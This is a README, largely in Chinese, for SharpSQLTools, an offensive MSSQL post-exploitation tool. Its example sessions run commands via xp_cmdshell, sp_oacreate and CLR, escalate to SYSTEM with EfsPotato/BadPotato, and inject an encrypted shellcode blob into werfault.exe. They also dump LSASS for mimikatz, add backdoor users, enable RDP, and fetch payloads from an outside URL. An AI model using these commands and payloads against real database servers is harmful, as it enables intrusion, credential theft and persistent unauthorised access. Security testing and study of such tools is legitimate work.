- 简介

和[RcoIl](http://github.com/rcoIl)一起写的小工具，可上传下载文件，xp_cmdshell与sp_oacreate双回显和clr加载程序集执行相应操作。功能参考[mssqlproxy](https://github.com/blackarrowsec/mssqlproxy)，由于目前C#还不知如何获取SQL连接的socket，该项目中的mssqlproxy功能目前尚未实现。另外，Clr不适用于一些与线程进程相关的操作。

##### 编译环境为net 4.0 

### 更新日志

- 2021-08-05
  - 添加clr_badpotato
  - 修改原来的clr_potato为clr_efspotato

- 2021-08-04
  - 添加一些clr实现的基本命令：pwd,ls,netstat,ps等等
  - 致谢[KevinJClark@csharptoolbox](https://gitlab.com/KevinJClark/csharptoolbox/-/tree/master/WindowsBinaryReplacements) & [rabbittb](https://github.com/rabbittb)

- 2021-08-03
  - 添加clr_efspotato
  - 致谢[zcgonvh@EfsPotato](https://github.com/zcgonvh/EfsPotato) & [hl0rey](https://github.com/hl0rey)

- 2021-07-10 
  - 修复上传bug
  - 修复clr回显bug
- 2021-06-22
  - 添加clr执行命令和程序 
  - 添加clr合并文件功能，方便在cmd被拦截时代替copy /b合并文件 
  - 修改支持自定义端口 
- 2021-05-27
  - 支持shellcode远程加载
- 2021-01-19
  - 支持xp_cmdshell与sp_oacreate双回显
  - 支持clr加载程序集执行
  - 支持上传下载文件
- 2019-12-18
  - 发布最初命令行版

### Usage

```
λ SharpSQLTools.exe

   _____ _                      _____  ____  _   _______          _
  / ____| |                    / ____|/ __ \| | |__   __|        | |
 | (___ | |__   __ _ _ __ _ __| (___ | |  | | |    | | ___   ___ | |___
  \___ \| '_ \ / _` | '__| '_ \\___ \| |  | | |    | |/ _ \ / _ \| / __|
  ____) | | | | (_| | |  | |_) |___) | |__| | |____| | (_) | (_) | \__ \
 |_____/|_| |_|\__,_|_|  | .__/_____/ \___\_\______|_|\___/ \___/|_|___/
                         | |
                         |_|
                                                    by Rcoil & Uknow

Usage:

SharpSQLTools target:port username password database                   - interactive console
SharpSQLTools target:port username password database module command    - non-interactive console

Module:

enable_xp_cmdshell         - you know what it means
disable_xp_cmdshell        - you know what it means
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
sp_oacreate {cmd}          - executes cmd using sp_oacreate
enable_ole                 - you know what it means
disable_ole                - you know what it means
upload {local} {remote}    - upload a local file to a remote path (OLE required)
download {remote} {local}  - download a remote file to a local path
enable_clr                 - you know what it means
disable_clr                - you know what it means
install_clr                - create assembly and procedure
uninstall_clr              - drop clr
clr_pwd                    - print current directory by clr
clr_ls {directory}         - list files by clr
clr_cd {directory}         - change directory by clr
clr_ps                     - list process by clr
clr_netstat                - netstat by clr
clr_ping {host}            - ping by clr
clr_cat {file}             - view file contents by clr
clr_rm {file}              - delete file by clr
clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
clr_badpotato {cmd}        - exec by BadPotato like clr_exec
clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
clr_dumplsass {path}       - dumplsass by clr
clr_rdp                    - check RDP port and Enable RDP
clr_getav                  - get anti-virus software on this machin by clr
clr_adduser {user} {pass}  - add user by clr
clr_download {url} {path}  - download file from url by clr
clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
clr_scloader1 {file} {key} - Encrypt Shellcode by Encrypt.py and Upload Payload.txt
clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader
exit                       - terminates the server process (and this session)

```

### 功能介绍

支持交互模式与非交互模式，交互模式直接跟目标，用户名和密码即可。非交互模式直接跟模块与命令。

```
SharpSQLTools target:port username password database                   - interactive console
SharpSQLTools target:port username password database module command    - non-interactive console
```



#### xp_cmdshell执行命令

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell master whoami 
[*] Database connection is successful!

nt authority\system

```



#### sp_oacreate执行命令

```
λ SharpSQLTools.exe 192.168.0.102 sa 1qaz@WSX master sp_oacreate master "whoami"
[*] Database connection is successful!

nt service\mssqlserver
```

#### clr执行命令

```
λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec whoami
[*] Database connection is successful!
[+] Process: cmd.exe
[+] arguments:  /c whoami
[+] RunCommand: cmd.exe  /c whoami

nt service\mssql$sqlexpress

λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\windows/system32\whoami.exe
[*] Database connection is successful!
[+] Process: c:\windows/system32\whoami.exe
[+] arguments:
[+] RunCommand: c:\windows/system32\whoami.exe

nt service\mssql$sqlexpress

λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\cmd.exe -a /c whoami
[*] Database connection is successful!
[+] Process: c:\cmd.exe
[+] arguments:  /c whoami
[+] RunCommand: c:\cmd.exe   /c whoami

nt service\mssql$sqlexpress

```

#### clr_efspotato or clr_badpotato

```
λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato whoami
[*] Database connection is successful!
Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.

[+] Current user: NT AUTHORITY\NETWORK SERVICE
[+] Get Token: 3352
[+] Command : c:\Windows\System32\cmd.exe /c whoami
[!] process with pid: 2012 created.
==============================


nt authority\system

λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\windows/system32\whoami.exe
[*] Database connection is successful!
Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.

[+] Current user: NT AUTHORITY\NETWORK SERVICE
[+] Get Token: 3084
[+] Command : c:\windows/system32\whoami.exe
[!] process with pid: 164 created.
==============================


nt authority\system

λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_efspotato -p c:\cmd.exe -a /c whoami
[*] Database connection is successful!
Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.

[+] Current user: NT AUTHORITY\NETWORK SERVICE
[+] Get Token: 3124
[+] Command : c:\cmd.exe   /c whoami
[!] process with pid: 2080 created.
==============================


nt authority\system
```

#### clr_scloader
```
λ python Encrypt.py -f nc.bin -k 1234
XorKey: 1234
Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==

λ SharpSQLTools.exe 192.168.0.107 sa 1qaz@WSX master clr_scloader zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfT F/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q== 1234
[*] Database connection is successful!
[+] EncryptShellcode: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
[+] XorKey: 1234
[+] StartProcess werfault.exe
[+] OpenProcess Pid: 2508
[+] VirtualAllocEx Success
[+] QueueUserAPC Inject shellcode to PID: 2508 Success
[+] hOpenProcessClose Success


[*] QueueUserAPC Inject shellcode Success, enjoy!
```

#### clr_scloader1
```
λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader1 C:\Users\Public\payload.txt aaaa
[*] Database connection is successful!
[+] EncryptShellcodePath: C:\Users\Public\payload.txt
[+] XorKey: aaaa
[+] StartProcess werfault.exe
[+] OpenProcess Pid: 3232
[+] VirtualAllocEx Success
[+] QueueUserAPC Inject shellcode to PID: 3232 Success
[+] hOpenProcessClose Success


[*] QueueUserAPC Inject shellcode Success, enjoy!
```

#### clr_scloader2
```
λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader2 C:\Users\Public\beacon.bin
[*] Database connection is successful!
[+] ShellcodePath: C:\Users\Public\beacon.bin
[+] StartProcess werfault.exe
[+] OpenProcess Pid: 332
[+] VirtualAllocEx Success
[+] QueueUserAPC Inject shellcode to PID: 332 Success
[+] hOpenProcessClose Success


[*] QueueUserAPC Inject shellcode Success, enjoy!
```

#### clr_dumplsass

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_dumplsass
[*] Database connection is successful!

[*] Dumping lsass (488) to C:\Windows\Temp\debug488.out
[+] Dump successful!

[*] Compressing C:\Windows\Temp\debug488.out to C:\Windows\Temp\debug488.bin gzip file
[X] Output file 'C:\Windows\Temp\debug488.bin' already exists, removing
[*] Deleting C:\Windows\Temp\debug488.out

[+] Dumping completed. Rename file to "debug488.gz" to decompress.

[*] Operating System : Windows Server 2008 R2 Standard
[*] Architecture     : AMD64
[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
```

### clr_RDP

```
λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX master "clr_RDP"
[*] Database connection is successful!
[*] RDP is already enabled
[+] RDP Port: 3389
```

### clr_getav

```
λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX master "clr_getav"
[*] Database connection is successful!
[*] Finding....
   [>] proName: wdswfsafe appName: 360杀毒-网盾
[*] Finish!
```

#### clr_adduser

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_adduser test1234 1qaz@WSX
[*] Database connection is successful!
[*] Adding User success
[*] Adding Group Member success
```

#### clr_combine
```
λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_combine C:\Users\Public\payload.txt
[*] Database connection is successful!
[+] remoteFile: C:\Users\Public\payload.txt
[+] count: 5
[+] combinefile: C:\Users\Public\payload.txt_*.config_txt C:\Users\Public\payload.txt
[*] 'C:\Users\Public\payload.txt_*.config_txt' CombineFile completed	
```

#### clr_download

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master clr_download "http://192.168.28.185:8001/clac.bin" "c:\Users\Public\Downloads\test.bin"
[*] Database connection is successful!
[*] Download success
```


#### upload

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master upload C:\Users\Pentest\Desktop\test\usc.exe c:\Users\Public\Downloads\11.exe
[*] Database connection is successful!
[*] Uploading 'C:\Users\Pentest\Desktop\test\usc.exe' to 'c:\Users\Public\Downloads\11.exe'...
[+] 7-1 Upload completed
[+] 7-2 Upload completed
[+] 7-3 Upload completed
[+] 7-4 Upload completed
[+] 7-5 Upload completed
[+] 7-6 Upload completed
[+] 7-7 Upload completed
[+] copy /b c:\Users\Public\Downloads\11.exe_x.config_txt c:\Users\Public\Downloads\11.exe
[+] del c:\Users\Public\Downloads\*.config_txt
[*] 'C:\Users\Pentest\Desktop\test\usc.exe' Upload completed
```



#### download

```
λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX master download c:\Users\Public\Downloads\t.txt C:\Users\Pentest\Desktop\test\t.txt
[*] Database connection is successful!
[*] Downloading 'c:\Users\Public\Downloads\t.txt' to 'C:\Users\Pentest\Desktop\test\t.txt'...
[*] 'c:\Users\Public\Downloads\t.txt' Download completed
```



### References

https://github.com/blackarrowsec/mssqlproxy

https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235

https://github.com/GhostPack/SharpDump

https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0

https://github.com/zcgonvh/EfsPotato

https://gitlab.com/KevinJClark/csharptoolbox